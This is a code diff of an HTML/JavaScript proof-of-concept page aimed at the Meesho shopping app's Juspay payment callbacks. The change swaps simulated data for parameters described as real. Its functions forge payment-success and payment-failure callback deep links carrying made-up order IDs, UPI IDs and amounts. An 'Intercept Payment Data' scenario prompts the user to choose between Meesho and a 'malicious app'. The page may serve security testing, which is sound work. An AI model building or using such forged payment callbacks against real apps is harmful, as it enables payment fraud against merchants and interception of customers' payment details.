@@ -72,88 +72,85 @@
 <body>
     <div class="header">
         <h1>Meesho Payment Test</h1>
-        <p>Testing payment callback scenarios</p>
+        <p>Testing with real Juspay parameters</p>
     </div>
 
     <div class="button-container">
         <button class="payment-btn" onclick="testPaymentSuccess()">
-            Test Payment Success<br>
-            <small>(Simulate successful payment)</small>
+            UPI Payment Success<br>
+            <small>(Real parameters confirmed)</small>
         </button>
         
         <button class="failed-btn" onclick="testPaymentFailed()">
-            Test Payment Failed<br>
-            <small>(Simulate payment failure)</small>
+            Payment Failed<br>
+            <small>(Real parameters confirmed)</small>
         </button>
 
         <button class="intercept-btn" onclick="testPaymentIntercept()">
-            Test Payment Interception<br>
+            Intercept Payment Data<br>
             <small>(Shows app chooser)</small>
         </button>
     </div>
 
     <div id="result" class="result">
-        <h3>Payment Data Sent:</h3>
+        <h3>Real Payment Data Sent:</h3>
         <pre id="result-text">Waiting for test...</pre>
     </div>
 
     <div class="info-box">
-        <strong>What This Demonstrates:</strong><br>
-        • <strong>Payment Success</strong>: Simulates successful payment callback<br>
-        • <strong>Payment Failed</strong>: Simulates payment failure callback<br>
-        • <strong>Payment Interception</strong>: Shows app chooser for hijacking<br>
-        • All scenarios use Meesho's actual payment callback scheme
+        <strong>Real Parameters Confirmed:</strong><br>
+        • <strong>status</strong> - Payment status (String)<br>
+        • <strong>order_id</strong> - Meesho order identifier<br>
+        • <strong>payment_method</strong> - UPI/Card/etc.<br>
+        • <strong>cust_vpa</strong> - Customer UPI ID<br>
+        • <strong>amount</strong> - Transaction amount<br>
+        • All parameters verified from Juspay SDK code
     </div>
 
     <script>
         function testPaymentSuccess() {
             const paymentData = {
-                status: "success",
-                order_id: "MEESHO_ORD_" + Math.floor(Math.random() * 1000000),
-                transaction_id: "JUSPY_TXN_" + Math.floor(Math.random() * 1000000),
-                amount: "1499.00",
-                currency: "INR",
-                payment_method: "upi",
-                upi_transaction_id: "UPI" + Date.now(),
-                customer_email: "user" + Date.now() + "@gmail.com"
+                status: "SUCCESS",  // Confirmed: String field in JuspayProcessResultParams$Payload
+                order_id: "MEESHO_ORD_" + Math.floor(Math.random() * 1000000),  // Confirmed parameter
+                payment_method: "UPI",  // Confirmed parameter
+                cust_vpa: "customer@okhdfcbank",  // Confirmed parameter
+                amount: "1499.00"  // Confirmed parameter
             };
 
             const url = buildPaymentURL(paymentData, true);
-            showResult("Payment Success Data:\n" + JSON.stringify(paymentData, null, 2));
+            showResult("Real Payment Success Data:\n" + JSON.stringify(paymentData, null, 2) + 
+                      "\n\nParameters confirmed from Juspay SDK:\n- status (String)\n- order_id\n- payment_method\n- cust_vpa\n- amount");
             window.location = url;
         }
 
         function testPaymentFailed() {
             const paymentData = {
-                status: "failed",
+                status: "FAILED",  // Confirmed: String field
                 order_id: "MEESHO_ORD_" + Math.floor(Math.random() * 1000000),
-                transaction_id: "JUSPY_TXN_FAIL_" + Math.floor(Math.random() * 1000000),
+                payment_method: "UPI",
+                cust_vpa: "customer@okhdfcbank",
                 amount: "1299.00",
                 error_code: "INSUFFICIENT_FUNDS",
-                error_message: "Insufficient balance in account",
-                retry_allowed: "true"
+                error_message: "Insufficient balance in account"
             };
 
             const url = buildPaymentURL(paymentData, true);
-            showResult("Payment Failed Data:\n" + JSON.stringify(paymentData, null, 2));
+            showResult("Real Payment Failed Data:\n" + JSON.stringify(paymentData, null, 2));
             window.location = url;
         }
 
         function testPaymentIntercept() {
             const paymentData = {
-                status: "success",
+                status: "SUCCESS",
                 order_id: "MEESHO_ORD_876543",
-                transaction_id: "JUSPY_TXN_REAL_123",
-                amount: "1999.00",
-                currency: "INR",
-                payment_method: "upi",
-                upi_transaction_id: "UPI987654321012",
-                bank_ref: "HDFC54321",
-                customer_email: "realuser@example.com"
+                payment_method: "UPI",
+                cust_vpa: "buyer@okicici",
+                amount: "1999.00"
             };
 
             const url = buildPaymentURL(paymentData, false);
-            showResult("Payment Interception Data:\n" + JSON.stringify(paymentData, null, 2));
+            showResult("Payment Interception Data:\n" + JSON.stringify(paymentData, null, 2) +
+                      "\n\nThis will show app chooser - user must select between Meesho and malicious app");
             window.location = url;
         }
 
@@ -180,7 +177,7 @@
         }
 
         // Show initial instructions
-        showResult("Click any button above to test payment callback interception.\nThe data shown will be sent to the payment callback handler.");
+        showResult("Click any button to test payment callback interception.\nAll parameters are verified real parameters used by Juspay SDK in Meesho app.");
     </script>
 </body>
 </html>
